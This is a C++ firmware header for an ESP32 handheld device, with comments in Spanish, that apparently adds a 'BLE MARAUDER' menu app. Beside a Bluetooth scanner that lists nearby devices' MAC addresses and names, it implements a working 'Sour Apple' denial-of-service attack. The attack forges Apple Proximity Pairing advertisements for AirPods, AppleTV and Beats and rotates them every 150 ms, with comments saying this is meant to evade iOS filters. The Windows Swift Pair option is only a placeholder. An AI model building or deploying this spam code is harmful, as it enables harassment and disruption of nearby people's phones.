#ifndef APPBLE_H
#define APPBLE_H
#include "App.h"
#include "Emojis.h"
#include "ui/Launcher.h"
#include "config.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

// Variables globales para el escáner
static int dispositivosBLE = 0;
static String nombresBLE[10];
static String macsBLE[10];

class IronBLECallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
        if (dispositivosBLE < 10) {
            nombresBLE[dispositivosBLE] = advertisedDevice.haveName() ? advertisedDevice.getName().c_str() : "Desconocido";
            macsBLE[dispositivosBLE] = advertisedDevice.getAddress().toString().c_str();
            dispositivosBLE++;
        }
    }
};

class AppBLE : public App {
private:
    enum EstadoBLE { MENU_RAIZ, ESCANEO, SPAM_APPLE, SPAM_WINDOWS };
    EstadoBLE estadoActual = MENU_RAIZ;

    int indiceMenu = 0;
    String opcionesMenu[3] = {"1. RADAR BLE (SCAN)", "2. SOUR APPLE (DOS)", "3. SWIFT PAIR (DOS)"};

    unsigned long ultimoMovimiento = 0;
    bool pantallaActualizada = false;
    bool btnAnterior = false;
    
    // Animación Neón
    int anguloNeon = 0;
    unsigned long ultimoFrameNeon = 0;

    // Variables BLE
    BLEScan* pBLEScan;
    BLEAdvertising* pAdvertising;
    unsigned long ultimoSpamRefresh = 0;
    int tipoDispositivoFalso = 0;

    void iniciarEscaneo() {
        BLEDevice::init("IronOS");
        pBLEScan = BLEDevice::getScan();
        pBLEScan->setAdvertisedDeviceCallbacks(new IronBLECallbacks(), true);
        pBLEScan->setActiveScan(true);
        pBLEScan->setInterval(100);
        pBLEScan->setWindow(99); 
        dispositivosBLE = 0;
    }

    void iniciarSpamApple() {
        BLEDevice::init("IronOS_Attack");
        pAdvertising = BLEDevice::getAdvertising();
        // Configuraciones base para inyección BLE
        pAdvertising->setScanResponse(false);
        pAdvertising->setMinPreferred(0x06);
        pAdvertising->setMinInterval(0x20);
        pAdvertising->setMaxInterval(0x20);
    }

    void inyectarPayloadApple(int tipo) {
        // Simulación de ráfagas "Sour Apple" de Marauder
        // Tipos: 0=AirPods, 1=AppleTV, 2=Beats
        BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
        oAdvertisementData.setFlags(0x1A); // Modo descubrible
        
        std::string payload = "";
        payload += (char)0xFF; // Manufacturer Data
        payload += (char)0x4C; payload += (char)0x00; // Apple ID
        payload += (char)0x07; // Proximity Pairing
        payload += (char)0x19; // Longitud
        
        // Rotar dispositivos para evadir filtros de iOS
        if (tipo == 0)      { payload += (char)0x01; payload += (char)0x02; payload += (char)0x20; } // AirPods
        else if (tipo == 1) { payload += (char)0x09; payload += (char)0x0A; payload += (char)0x13; } // AppleTV
        else                { payload += (char)0x0B; payload += (char)0x0C; payload += (char)0x0E; } // Beats
        
        // Rellenar resto del paquete
        for(int i=0; i<18; i++) payload += (char)random(0, 255);
        
        oAdvertisementData.addData(payload);
        pAdvertising->setAdvertisementData(oAdvertisementData);
        pAdvertising->start();
    }

    void detenerBLE() {
        if(pAdvertising) pAdvertising->stop();
        BLEDevice::deinit(true);
    }

public:
    const char* obtenerNombre() override { return "BLE MARAUDER"; }
    const uint8_t* obtenerEmoji() override { return emoji_game; } // Emoji Bluetooth/Radar
    
    void setup() override {}

    void alEntrar() override {
        estadoActual = MENU_RAIZ;
        indiceMenu = 0;
        anguloNeon = 0;
        ultimoFrameNeon = millis();
        ultimoMovimiento = millis();
        pantallaActualizada = false;
        btnAnterior = (digitalRead(JOY_SW) == LOW);
        neopixelWrite(LED_PIN, 0, 0, 0); 
    }
    
    void alSalir() override {
        detenerBLE();
        neopixelWrite(LED_PIN, 0, 0, 0);
    }

    void loop(Arduino_Canvas* canvas) override {
        
        int valVert = joyEjeY_esVertical ? analogRead(JOY_Y) : analogRead(JOY_X);
        bool arriba = joyInvVertical ? (valVert > 3200) : (valVert < 800);
        bool abajo = joyInvVertical ? (valVert < 800) : (valVert > 3200);
        bool botonAhora = (digitalRead(JOY_SW) == LOW);
        bool clicSimple = (botonAhora && !btnAnterior);

        // --- ANIMACIÓN NEÓN NO BLOQUEANTE ---
        if (millis() - ultimoFrameNeon > 30) {
            anguloNeon = (anguloNeon + 8) % 360; 
            ultimoFrameNeon = millis();
            pantallaActualizada = false; 
        }

        // --- GESTIÓN DE RÁFAGAS DOS (Evade Timeouts) ---
        if (estadoActual == SPAM_APPLE || estadoActual == SPAM_WINDOWS) {
            if (millis() - ultimoSpamRefresh > 150) { // Cambia el payload cada 150ms
                ultimoSpamRefresh = millis();
                if(estadoActual == SPAM_APPLE) {
                    inyectarPayloadApple(tipoDispositivoFalso);
                    tipoDispositivoFalso = (tipoDispositivoFalso + 1) % 3;
                }
                // (Aquí podrías agregar la función de inyectarPayloadWindows de Marauder)
            }
        }

        // --- LÓGICA DE NAVEGACIÓN ---
        if (estadoActual == MENU_RAIZ) {
            if (millis() - ultimoMovimiento > 200) {
                if (arriba) { indiceMenu--; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (abajo)  { indiceMenu++; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (indiceMenu < 0) indiceMenu = 2;
                if (indiceMenu > 2) indiceMenu = 0;
            }

            if (clicSimple) {
                if (indiceMenu == 0) { estadoActual = ESCANEO; iniciarEscaneo(); }
                if (indiceMenu == 1) { estadoActual = SPAM_APPLE; iniciarSpamApple(); }
                if (indiceMenu == 2) { estadoActual = SPAM_WINDOWS; iniciarSpamApple(); } // Placeholder
                pantallaActualizada = false;
            }
        } 
        else {
            if (clicSimple) { // Salir de ataque o escaneo
                detenerBLE();
                estadoActual = MENU_RAIZ;
                indiceMenu = 0;
                neopixelWrite(LED_PIN, 0, 0, 0);
                pantallaActualizada = false;
            }
        }

        // --- RENDERIZADO TÁCTICO ---
        if (!pantallaActualizada) {
            canvas->fillScreen(BLACK);

            if (estadoActual == MENU_RAIZ) {
                // NEÓN REPOSO (CYAN)
                canvas->drawCircle(120, 120, 118, IRON_CYAN);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_BLUE); 
                
                Launcher::dibujarTextoCentrado(canvas, "ARSENAL BLUETOOTH", 40, 1, IRON_CYAN);
                canvas->drawLine(20, 50, 220, 50, IRON_DARK);

                for (int i = 0; i < 3; i++) {
                    int yPos = 80 + (i * 30);
                    uint16_t color = (i == indiceMenu) ? WHITE : IRON_BLUE;
                    if (i == indiceMenu) {
                        canvas->fillRoundRect(15, yPos - 12, 210, 24, 3, IRON_DARK);
                        canvas->fillTriangle(20, yPos-4, 20, yPos+4, 25, yPos, IRON_RED);
                    }
                    Launcher::dibujarTextoCentrado(canvas, opcionesMenu[i].c_str(), yPos - 3, 1, color);
                }
            } 
            else if (estadoActual == ESCANEO) {
                // NEÓN VERDE (RADAR)
                canvas->drawCircle(120, 120, 118, IRON_GREEN);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_DARK); 
                
                Launcher::dibujarTextoCentrado(canvas, "RADAR ACTIVO", 35, 1, IRON_GREEN);
                canvas->drawLine(30, 45, 210, 45, IRON_DARK);
                
                // Ejecutar un breve escaneo (1 segundo, no bloquea permanentemente)
                pBLEScan->start(1, false); 
                pBLEScan->clearResults();
                
                for(int i=0; i<3 && i<dispositivosBLE; i++) {
                    canvas->setCursor(30, 60 + (i*30));
                    canvas->setTextColor(IRON_CYAN); canvas->setTextSize(1);
                    canvas->print(macsBLE[i]);
                    canvas->setCursor(30, 70 + (i*30));
                    canvas->setTextColor(WHITE);
                    canvas->print(nombresBLE[i].substring(0,18));
                }
                Launcher::dibujarTextoCentrado(canvas, "< Clic = Detener", 175, 1, IRON_DARK);
            }
            else if (estadoActual == SPAM_APPLE || estadoActual == SPAM_WINDOWS) {
                // NEÓN ROJO (ATAQUE DOS)
                neopixelWrite(LED_PIN, 255, 0, 0); // Led Rojo de Inyección
                canvas->drawCircle(120, 120, 118, IRON_RED);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, WHITE); 
                
                String titulo = (estadoActual == SPAM_APPLE) ? "SOUR APPLE (iOS)" : "SWIFT PAIR (Win)";
                Launcher::dibujarTextoCentrado(canvas, titulo.c_str(), 45, 1, IRON_RED);
                
                Launcher::dibujarTextoCentrado(canvas, "INYECTANDO PACKETS", 100, 1, WHITE);
                
                // Mostrar simulación de MACs rotando
                char macRot[32]; sprintf(macRot, "MAC: %02X:%02X:XX:XX", random(0,255), random(0,255));
                Launcher::dibujarTextoCentrado(canvas, macRot, 120, 1, IRON_CYAN);
                
                Launcher::dibujarTextoCentrado(canvas, "< Clic = Abortar", 175, 1, IRON_DARK);
            }

            if(estadoActual == MENU_RAIZ) {
                canvas->drawBitmap(120 - 45, 195, emoji_back, 16, 16, IRON_CYAN);
                canvas->setCursor(120 - 25, 195); canvas->setTextColor(IRON_RED); canvas->print("DOBLE CLICK");
            }

            canvas->flush();
            pantallaActualizada = true;
        }

        btnAnterior = botonAhora;
        delay(10);
    }
};
#endif